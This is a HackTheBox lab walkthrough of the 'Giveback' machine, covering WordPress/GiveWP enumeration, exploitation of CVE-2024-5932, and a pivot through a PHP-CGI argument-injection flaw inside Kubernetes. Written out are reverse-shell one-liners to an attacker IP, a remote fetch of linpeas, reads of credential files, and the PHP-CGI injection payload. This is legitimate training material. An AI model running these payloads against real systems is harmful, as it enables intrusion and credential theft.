# **Giveback - HackTheBox**

*Target Ip. Address: 10.129.242.171*

So, let' start with our nmap scan to kickstart this challenge.

```bash
kali@kali:nmap -sV -sC 10.129.242.171
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 11:49 +0545
Nmap scan report for 10.129.242.171 (10.129.242.171)
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.74 second
```

So, we have only 2 ports 22 and 80.
Before that add giveback.htb at /etc/hosts

```bash
kali@kali:cat /etc/hosts
10.129.242.171   giveback.htb


127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Wappalyzer told this is a Wordpress site with Wordpress v. 6.8.1 and has a GiveWP plugin.

So, running whatweb, it reveals that GiveWP plugin is Give v3.14.0

```bash
kali@kali:whatweb http://giveback.htb
http://giveback.htb [200 OK] Bootstrap[0.3], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.28.0], IP[10.129.242.171], JQuery[3.7.1], MetaGenerator[Give v3.14.0,WordPress 6.8.1], Script[speculationrules,text/javascript], Title[GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI], UncommonHeaders[link], WordPress[6.8.1], nginx[1.28.0]
```


Let's run wpscan to see if this is vulnerable.

```bash
kali@kali:wpscan --url http://giveback.htb --enumerate vp --api-token=75.....Vc --no-update     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://giveback.htb/ [10.129.242.171]
[+] Started: Wed Feb  4 11:56:29 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2026-01-28T15:00:00.000Z
 | [!] The version is out of date, the latest version is 4.14.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 22 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 |
 | [!] Title: GiveWP < 3.16.0 - Unauthenticated Full Path Disclosure
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/6ff11e50-188e-4191-be12-ab4bde9b6d27
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6551
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2a13ce09-b312-4186-b0e2-63065c47f15d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Authenticated (GiveWP Manager+) SQL Injection via order Parameter
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/aed98bed-b6ed-4282-a20e-995515fd43a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9130
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a3cae01-620d-405e-baf6-2d66a5b429b3
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1807282-5f15-4b21-81b6-dcb8b03618bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8353
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4c530fa-eaf4-4721-bfb6-9fc06d7f343c
 |
 | [!] Title: GiveWP < 3.16.0 - Cross-Site Request Forgery
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/582c6a46-486e-41ca-9c45-96dfe8b8ddbb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47315
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ce9bac7-60bb-4880-9e37-4d71f02ee941
 |
 | [!] Title: GiveWP < 3.16.4 - Unauthenticated PHP Object Injection to Remote Code Execution
 |     Fixed in: 3.16.4
 |     References:
 |      - https://wpscan.com/vulnerability/793bdc97-69eb-43c3-aab0-c86a76285f36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9634
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8eb3aa9-fe60-48b6-aa24-7873dd68b47e
 |
 | [!] Title: Give < 3.19.0 - Reflected XSS
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f196294-5ba9-45b6-a27c-ab1702cc001f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11921
 |
 | [!] Title: GiveWP < 3.19.3 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.3
 |     References:
 |      - https://wpscan.com/vulnerability/571542c5-9f62-4e38-baee-6bbe02eec4af
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12877
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b2143edf-5423-4e79-8638-a5b98490d292
 |
 | [!] Title: GiveWP < 3.19.4 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.4
 |     References:
 |      - https://wpscan.com/vulnerability/82afc2f7-948b-495e-8ec2-4cd7bbfe1c61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/06a7ff0b-ec6b-490c-9bb0-fbb5c1c337c4
 |
 | [!] Title: GiveWP < 3.20.0 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/e27044bd-daab-47e6-b399-de94c45885c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0912
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a8ae1b0-e9a0-4179-970b-dbcb0642547c
 |
 | [!] Title: Give < 3.22.1 - Missing Authorization to Unauthenticated Arbitrary Earning Reports Disclosure via give_reports_earnings Function
 |     Fixed in: 3.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebe88626-2127-4021-aa8e-f2f47e12ad4f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2025
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40595943-121d-4492-a0ed-f2de1bd99fda
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.22.2 - Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/b331a81b-b7cc-4e0a-a088-26468a835cc5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2331
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b4d9acfb-bb9d-4b00-b439-c7ccea751f8d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.3.1 - Missing Authorization To Authenticated (Contributor+) Campaign Data View And Modification
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/f819ea85-bf28-4e8c-b72b-59741e7e9cee
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4571
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f03b4ef-e877-430e-a440-3af0feca818c
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.0 - Authenticated (GiveWP worker+) Stored Cross-Site Scripting
 |     Fixed in: 4.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fda8eaea-ca20-417a-896b-49c1fa0a1c07
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7205
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/39e501d8-88a0-4625-aeb0-aa33fc89a8d4
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.1 - Unauthenticated Donor Data Exposure
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/4739fdb8-9444-44b9-8e98-7a299e6fe186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8620
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6dc7c5a6-513e-4aa8-9538-0ac6fb37c867
 |
 | [!] Title: GiveWP < 4.6.1 - Missing Authorization to Donation Update
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/bdfb968d-df2b-43ed-9a9c-f9b15d8457f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7221
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8766608e-df72-4b9d-a301-a50c64fadc9a
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.10.1 - Missing Authorization to Unauthenticated Forms-Campaign Association
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/5dccab73-e06f-4c01-837b-eddf42ea789d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11228
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ddf9a043-5eb6-46fd-88c2-0f5a04f73fc9
 |
 | [!] Title: GiveWP < 4.10.1 - Unauthenticated Forms and Campaigns Disclosure
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/e7a291a5-3846-42e7-b4f2-7b2383326d4c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11227
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/54db1807-69ff-445c-9e02-9abce9fd3940
 |
 | [!] Title: GiveWP < 4.13.1 - Unauthenticated Stored XSS via 'name'
 |     Fixed in: 4.13.1
 |     References:
 |      - https://wpscan.com/vulnerability/c03133b5-80f0-4d70-ad22-5dbd7e290031
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13206
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95823720-e1dc-46c1-887b-ffd877b2fbe5
 |
 | [!] Title: GiveWP < 4.13.2 - Cross-Site Request Forgery
 |     Fixed in: 4.13.2
 |     References:
 |      - https://wpscan.com/vulnerability/c7ee6f8c-5b2e-4074-9334-25ceaecc664d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67467
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e6a7ec29-6dc6-4c73-8cc4-4aa4da79941e
 |
 | [!] Title: GiveWP < 4.13.2 - Unauthenticated Arbitrary Shortcode Execution
 |     Fixed in: 4.13.2
 |     References:
 |      - https://wpscan.com/vulnerability/3d8f4752-888f-45e3-8232-ca65078bdc98
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66533
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b9860e0e-e330-42fc-8a74-336ceb787f39
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

[+] Finished: Wed Feb  4 11:56:52 2026
[+] Requests Done: 42
[+] Cached Requests: 7
[+] Data Sent: 10.11 KB
[+] Data Received: 285.79 KB
[+] Memory used: 233.465 MB
[+] Elapsed time: 00:00:22
```


So, we have lot's of vulnerabilities in this specific plugin. We will try to use CVE-2024-5932, a critical PHP Object Injection flaw that allows unauthenticated remote code execution (RCE).

Clone this GitHub repository.


```bash
kali@kali:git clone https://github.com/EQSTLab/CVE-2024-5932
Cloning into 'CVE-2024-5932'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (19/19), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 19 (delta 9), reused 5 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (19/19), 11.04 KiB | 136.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
```

Install the requirements, before running the script. Also make a virtual environment using python.


```bash
kali@kali:python3 -m venv giveback

kali@kali:source giveback/bin/activate
```
                                                                                                    
```bash
kali@kali:pip install -r requirements.txt
Collecting requests (from -r requirements.txt (line 1))
  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
Collecting rich_click (from -r requirements.txt (line 2))
  Downloading rich_click-1.9.7-py3-none-any.whl.metadata (8.7 kB)
Collecting beautifulsoup4 (from -r requirements.txt (line 3))
  Using cached beautifulsoup4-4.14.3-py3-none-any.whl.metadata (3.8 kB)
Collecting Faker (from -r requirements.txt (line 4))
  Using cached faker-40.1.2-py3-none-any.whl.metadata (16 kB)
Collecting charset_normalizer<4,>=2 (from requests->-r requirements.txt (line 1))
  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 1))
  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 1))
  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 1))
  Using cached certifi-2026.1.4-py3-none-any.whl.metadata (2.5 kB)
Collecting click>=8 (from rich_click->-r requirements.txt (line 2))
  Using cached click-8.3.1-py3-none-any.whl.metadata (2.6 kB)
Collecting rich>=12 (from rich_click->-r requirements.txt (line 2))
.
.
.
.
.
Installing collected packages: urllib3, typing-extensions, soupsieve, pygments, mdurl, idna, Faker, click, charset_normalizer, certifi, requests, markdown-it-py, beautifulsoup4, rich, rich_click
Successfully installed Faker-40.1.2 beautifulsoup4-4.14.3 certifi-2026.1.4 charset_normalizer-3.4.4 click-8.3.1 idna-3.11 markdown-it-py-4.0.0 mdurl-0.1.2 pygments-2.19.2 requests-2.32.5 rich-14.3.2 rich_click-1.9.7 soupsieve-2.8.3 typing-extensions-4.15.0 urllib3-2.6.3
```

So, let's get ourselves a reverse shell. Set up a listener on a port.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.54 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

And, let's run our script.


```bash
kali@kali:python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need -c "bash -c 'bash -i >& /dev/tcp/10.10.16.26/4444 0>&1'"
```

And, there we go. We get a reverse shell on our listener.

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.54 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from beta-vino-wp-wordpress-65c8694d9b-f8p8l~10.129.242.171-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.16.26:4444
[-] Failed spawning new session
[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/sessions/beta-vino-wp-wordpress-65c8694d9b-f8p8l~10.129.242.171-Linux-x86_64/2026_02_04-12_24_10-338.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from beta-vino-wp-wordpress-65c8694d9b-f8p8l~10.129.242.171-Linux-x86_64 😍 Assigned SessionID <2>
<-65c8694d9b-f8p8l:/opt/bitnami/wordpress/wp-admin$ 
```

We are inside a docker container, so we have a long way to go.

At wp-config.php, we have a DB_USER and DB_PASSWORD.

```bash
<wordpress-65c8694d9b-f8p8l:/opt/bitnami/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
.
.
.
.
.
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW.....oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Some more passwords we get at /secrets.

```bash
I have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/secrets$ cat mariadb-password
<ess-65c8694d9b-f8p8l:/secrets$ cat mariadb-password              
sW.....SI have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/secrets$ cat mariadb-root-password
<5c8694d9b-f8p8l:/secrets$ cat mariadb-root-password              
sW.....SI have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/secrets$ cat wordpress-password
<s-65c8694d9b-f8p8l:/secrets$ cat wordpress-password              
O8.....I have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/secrets$ 
```

But, we can't use these, as mysql cannot be used.

```bash
O8F7KR5zGiI have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/secrets$ mysql
mysql
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
ERROR 2002 (HY000): Can't connect to local server through socket '/opt/bitnami/mysql/tmp/mysql.sock' (2)
```

We have very limited options here, many commands are either disabled or not available in this container.

So, uploading any exploit is hard here.

Let's start with linpeas.

And, don't forget to start a http.server too.

```bash
I have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/home$ php -r 'copy("http://10.10.16.26/linpeas.sh", "/tmp/linpeas.sh");'
<ttp://10.10.16.26/linpeas.sh", "/tmp/linpeas.sh");'           

<ss-65c8694d9b-f8p8l:/home$ chmod +x /tmp/linpeas.sh  
```

From linpeas we learn that at 10.43.2.241:5000, legacy service is running.


```info
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_USERNAME=user
BITNAMI_VOLUME_DIR=/bitnami
WORDPRESS_VERIFY_DATABASE_SSL=yes
KUBERNETES_SERVICE_PORT=443
WORDPRESS_ENABLE_HTTPS=no
KUBERNETES_PORT=tcp://10.43.0.1:443
WORDPRESS_MULTISITE_HOST=
APACHE_HTTPS_PORT_NUMBER=8443
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
HOSTNAME=beta-vino-wp-wordpress-65c8694d9b-f8p8l
PHP_DEFAULT_POST_MAX_SIZE=80M
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WEB_SERVER_DAEMON_GROUP=daemon
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
WP_NGINX_SERVICE_SERVICE_PORT=80
SHLVL=2
WEB_SERVER_DAEMON_USER=daemon
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
HOME=/
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_LAST_NAME=LastName
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
OLDPWD=/home
```

Let's see what is there.


```bash
I have no name!@beta-vino-wp-wordpress-65c8694d9b-f8p8l:/tmp$ php -r "echo file_get_contents('http://10.43.2.241:5000/');"
<cho file_get_contents('http://10.43.2.241:5000/');"          
<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>🏢 GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment – Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>⚠️ Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> — VPN Required</li>
      <li><a href="/backups/">/backups/</a> — VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
      <li><a href="/debug/">/debug/</a> — Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>
```

We will use PHP-CGI RCE chain in this context.

Start a listener.

```bash
kali@kali:penelope -p 2222
[+] Listening for reverse shells on 0.0.0.0:2222 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Run this from inside the container.

```bash
<wordpress-6dd8d7f797-gdp9r:/opt/bitnami/wordpress$ php -r '$hello="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.26 2222 >/tmp/f"; $o = array("http"=>array("method"=>"POST", "header"=>"Content-Type: application/x-www-form-urlencoded","content"=>$hello,"timeout"=>4)); $c=stream_context_create($o); $r=@file_get_contents("http://legacy-intranet-service:5000/cgi-bin/php-cgi?--define+allow_url_include%3don+--define+auto_prepend_file%3dphp://input", false,$c); echo $r==false?"":substr($r,0,5000);
```

Running the exploit should drop the shell on kubernetes docker.

```bash
kali@kali:penelope -p 2222
[+] Listening for reverse shells on 0.0.0.0:2222 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-lfw7l~10.129.242.171-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.16.26:2222
[-] Failed spawning new session
[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/sessions/legacy-intranet-cms-6f7bf5db84-lfw7l~10.129.242.171-Linux-x86_64/2026_02_10-13_22_11-521.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-lfw7l~10.129.242.171-Linux-x86_64 😍 Assigned SessionID <2>

/var/www/html/cgi-bin # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Let's see if we find any kubernetes token.

```bash
/var/www/html/cgi-bin # ls -la /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root           140 Feb 10 08:39 .
drwxr-xr-x    3 root     root          4096 Feb 10 08:39 ..
drwxr-xr-x    2 root     root           100 Feb 10 08:39 ..2026_02_10_08_39_28.2903129093
lrwxrwxrwx    1 root     root            32 Feb 10 08:39 ..data -> ..2026_02_10_08_39_28.2903129093
lrwxrwxrwx    1 root     root            13 Feb 10 08:39 ca.crt -> ..data/ca.crt
